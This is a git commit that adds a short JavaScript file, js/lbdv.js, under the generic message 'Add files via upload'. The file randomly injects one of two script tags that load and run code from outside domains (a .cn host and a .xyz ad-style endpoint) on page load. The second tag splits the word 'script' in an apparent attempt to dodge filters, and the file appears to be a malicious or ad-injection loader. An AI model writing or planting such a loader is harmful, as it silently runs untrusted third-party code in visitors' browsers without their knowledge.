3896bfa86e0f7e67968fb34ebaf94d60b9e98d57
heihub <63719020+heihub@users.noreply.github.com>
2020-07-16 01:19:07 -0700

    Add files via upload

---
+++ js/lbdv.js
@@ -0,0 +1,10 @@
+var m = 2;
+var n = Math.floor(Math.random() * m + 1);
+switch (n) {
+case 1:
+document.writeln('<script src="https://p.minyaartcrafts.cn/dipper/4897D855-9572-4CCD-BE03-2DA21D3F0935.po"></script>');
+break;
+case 2:
+document.write('<scr'+'ipt src="//xcfds.xyz/cf.aspx?action=cycadget&ad_class=7&userid=86&lowunionusername=&clickstate=2&adshowtype=AdCode_sjdb&ad_size=640x200&newadsel=1&maxadid=&prohibit="></scr'+'ipt>');
+break;
+}
